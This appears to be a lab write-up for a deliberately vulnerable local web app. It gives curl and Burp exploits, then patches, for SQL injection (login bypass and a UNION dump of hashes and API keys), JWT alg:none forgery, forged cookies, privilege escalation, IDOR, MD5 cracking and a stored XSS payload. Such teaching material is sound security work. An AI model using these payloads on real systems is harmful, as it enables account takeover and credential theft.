# Vulnerabilities — exploits & patches

Every exploit below is reproduced with `curl` (copy/paste) and a note on how to do
the same in **Burp Suite**. All commands assume the vulnerable server:

```bash
RESET_DB=1 APP_MODE=vuln python3 app.py     # http://127.0.0.1:3000
```

To confirm a fix, restart in secure mode and repeat the same request:

```bash
RESET_DB=1 APP_MODE=secure python3 app.py   # same requests should now fail
```

Base URL used below: `B=http://127.0.0.1:3000`

---

## 1. SQL injection

**Where:** `app.py` → `h_login` and `h_search` (marked `# VULN: SQL injection`).
**Why:** user input is concatenated directly into the SQL string.

```python
# h_login (vuln)
sql = ("SELECT * FROM users WHERE username = '" + username + "' "
       "AND password_hash = '" + pwd_md5 + "'")
rows = db.vuln_query(conn, sql)
```

### Exploit A — login bypass (authenticate as admin with no password)

Send `admin'-- ` as the username. The `--` comments out the password check:

```
SELECT * FROM users WHERE username = 'admin'-- ' AND password_hash = '...'
```

```bash
curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin'\''-- ","password":"anything"}'
# -> 200 with a valid admin JWT
```

### Exploit B — UNION data exfiltration (dump password hashes + API keys)

The search endpoint selects 4 columns (`id, username, full_name, email`). Match
that column count in a `UNION SELECT` to pull secrets into the result:

```bash
# first get any valid token (search requires auth) — or reuse the admin token above
TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# payload:  zzz%' UNION SELECT id,username,password_hash,api_key FROM users--
curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
  --data-urlencode "q=zzz%' UNION SELECT id,username,password_hash,api_key FROM users-- "
# -> every user's MD5 hash appears in "full_name" and api_key in "email"
```

**Burp:** capture the login/search request, send to **Repeater**, edit the JSON
`username` / the `q=` parameter, replay. Try `' OR '1'='1`, `' UNION SELECT ...`,
and time-based payloads.

**Impact:** full authentication bypass and disclosure of every credential hash.
Chains directly into finding #5 (the MD5 hashes crack instantly).

### Patch

Bind values as parameters — the SQL text and the data travel on separate channels,
so input can never change the statement's structure:

```python
# h_login (secure)
rows = db.safe_query(conn, "SELECT * FROM users WHERE username = ?", (username,))
user = rows[0] if rows else None
if user and not auth.verify_password(password, user):
    user = None

# h_search (secure) — wildcards go into the VALUE, not the SQL
rows = db.safe_query(conn,
    "SELECT id, username, full_name, email FROM users WHERE full_name LIKE ?",
    ("%" + q + "%",))
```

**Verify fixed:** the login payload returns `401 invalid credentials`; the UNION
payload returns `{"results": []}`.

---

## 2. Authentication bypass

Two independent flaws, both under `# VULN: Auth bypass`.

### 2a. JWT signature is never verified (and `alg:none` is accepted)

**Where:** `auth.py` → `jwt_decode_vuln`.

```python
if header.get("alg") == "none":
    return payload          # no signature required at all
# ... otherwise still returns payload WITHOUT checking the signature
```

**Exploit:** forge a token with any claims you like. No secret needed:

```bash
FORGED=$(python3 - <<'PY'
import auth, json
h = auth.b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = auth.b64url_encode(json.dumps({"sub":2,"username":"alice","role":"admin"}).encode())
print(f"{h}.{p}.")   # empty signature
PY
)
curl -s "$B/api/admin/users" -H "Authorization: Bearer $FORGED"   # -> full admin listing
```

**Burp:** use the **JWT Editor** extension (or decode the base64 by hand in
Decoder), change `"role"` to `admin` / `"alg"` to `none`, drop the signature, replay.

### 2b. Forgeable "remember me" cookie

**Where:** `auth.py` → `remember_cookie_vuln` (cookie = `base64(username)`).

```bash
COOKIE=$(python3 -c 'import auth;print(auth.b64url_encode(b"admin"))')  # "YWRtaW4"
curl -s "$B/api/me" -H "Cookie: remember=$COOKIE"    # -> you are now admin
```

**Impact:** anyone can impersonate any user / elevate to admin with zero secrets.

### Patch

```python
# auth.py — verify algorithm, signature (constant time), and expiry
def jwt_decode_secure(token):
    h_b64, p_b64, s_b64 = token.split(".")
    header = json.loads(b64url_decode(h_b64))
    if header.get("alg") != "HS256":                 # pin alg; reject 'none'
        return None
    expected = _sign(f"{h_b64}.{p_b64}".encode())
    if not hmac.compare_digest(expected, s_b64):     # verify signature
        return None
    payload = json.loads(b64url_decode(p_b64))
    if int(payload.get("exp", 0)) < time.time():     # enforce expiry
        return None
    return payload
```

Remember-me becomes a 256-bit random token; only its SHA-256 is stored in
`remember_tokens` and looked up server-side (`new_remember_token_secure`).

**Verify fixed:** the `alg:none` token and the `remember=YWRtaW4` cookie both
return `401`. A *tampered* but otherwise-signed token also fails
(`hmac.compare_digest` mismatch).

---

## 3. Privilege escalation

### 3a. Role chosen by the client at registration

**Where:** `app.py` → `h_register`.

```python
role = body.get("role", "user")   # VULN: client controls its own role
```

```bash
curl -s -X POST $B/api/register -H 'Content-Type: application/json' \
  -d '{"username":"eve","password":"x","role":"admin"}'      # eve is now admin
```

### 3b. Admin gate trusts a client-supplied claim

**Where:** `app.py` → `h_admin_users`.

```python
if ident.get("role") != "admin":   # VULN: 'role' comes from the (unverified) token
    return 403
```

Combined with #2a, forging `role:admin` walks straight into the admin API.

### Patch

```python
# h_register (secure): server assigns the role; the client field is ignored
role = "user"

# h_admin_users (secure): re-derive the role from the DB using the verified subject
requester = load_user_by_id(conn, ident.get("sub"))
if not requester or requester["role"] != "admin":
    return 403
```

Principle: **authentication data may come from the token; authorization decisions
must be re-checked against server-side state.**

**Verify fixed:** registering with `role:admin` yields a `user`; the forged-admin
token gets `403` at `/api/admin/users`, while a real admin login gets `200`.

---

## 4. Insecure Direct Object Reference (IDOR)

**Where:** `app.py` → `h_get_user`.

```python
# VULN: no authorization check — returns ANY user incl. api_key + password_hash
user = load_user_by_id(conn, target_id)
return public_user(user, include_sensitive=True)
```

**Exploit:** as low-privileged `alice`, read the admin's record:

```bash
curl -s "$B/api/users/1" -H "Authorization: Bearer $TOK"
# -> admin's email, api_key, and password_hash
```

Iterate `1,2,3,…` to enumerate every account. **Burp Intruder** with a numeric
payload on the `:id` position dumps them all.

### Patch

```python
# secure: must be authenticated; only your own record unless admin; hide secrets
if not (is_self or is_admin):
    return 403
return public_user(user, include_sensitive=is_self or is_admin)
```

**Verify fixed:** `alice` reading `/api/users/1` (admin) → `403`; reading her own
`/api/users/2` → `200` (own secrets OK); an admin can read anyone.

---

## 5. Weak password hashing

**Where:** `auth.py` → `hash_password` (`# VULN`) — unsalted **MD5**.

```python
return hashlib.md5(password.encode()).hexdigest(), None, "md5"
```

**Exploit:** the hashes leaked via #1B / #4 crack instantly. `admin123` →
`0192023a7bbd73250516f069df18b500`. Confirm with a reverse lookup or:

```bash
python3 -c 'import hashlib;print(hashlib.md5(b"admin123").hexdigest())'
# 0192023a7bbd73250516f069df18b500  -> matches the dumped hash
```

Unsalted also means identical passwords share a hash (rainbow-table friendly).

### Patch

```python
# secure: per-user random salt + slow KDF (PBKDF2-HMAC-SHA256, 200k iterations)
salt = secrets.token_hex(16)
dk = hashlib.pbkdf2_hmac("sha256", password.encode(),
                         bytes.fromhex(salt), PBKDF2_ITERATIONS)
return dk.hex(), salt, "pbkdf2"
# verification uses hmac.compare_digest (constant time)
```

> Production note: `bcrypt`, `scrypt`, or `argon2` are preferable to PBKDF2. PBKDF2
> is used here because it ships in the Python standard library (no dependencies).

**Verify fixed:** in secure mode `SELECT hash_scheme FROM users` shows `pbkdf2`
with a 32-hex-char salt; the stored hash is not a bare MD5 and does not reverse.

---

## 6. Stored XSS *(bonus)*

**Where:** `static/app.js` → `listNotes` renders a note body with `innerHTML` in
vuln mode; `app.py` → `h_create_note` stores it raw.

**Exploit:** create a note, then load the notes list to fire it:

```bash
curl -s -X POST $B/api/notes -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"title":"pwn","body":"<img src=x onerror=alert(document.cookie)>"}'
```

Open the UI, click **Refresh notes** → the payload executes.

### Patch

Encode on output (primary) and neutralize on input (defense in depth):

```javascript
bodySpan.textContent = n.body || "";   // secure: never parsed as HTML
```
```python
note_body = html.escape(note_body)     # secure: stored escaped
```

**Verify fixed:** in secure mode the payload is displayed as literal text and does
not execute.

---

## Coverage summary

| # | Vulnerability | Reproduced | Patched & re-verified |
|---|---------------|:----------:|:---------------------:|
| 1 | SQL injection (login bypass + UNION dump) | ✅ | ✅ |
| 2 | Auth bypass (JWT no-verify / `alg:none` + remember-me) | ✅ | ✅ |
| 3 | Privilege escalation (register role + claim-trusting authz) | ✅ | ✅ |
| 4 | IDOR (user records incl. secrets) | ✅ | ✅ |
| 5 | Weak password hashing (unsalted MD5) | ✅ | ✅ |
| 6 | Stored XSS (note rendering) | ✅ | ✅ |
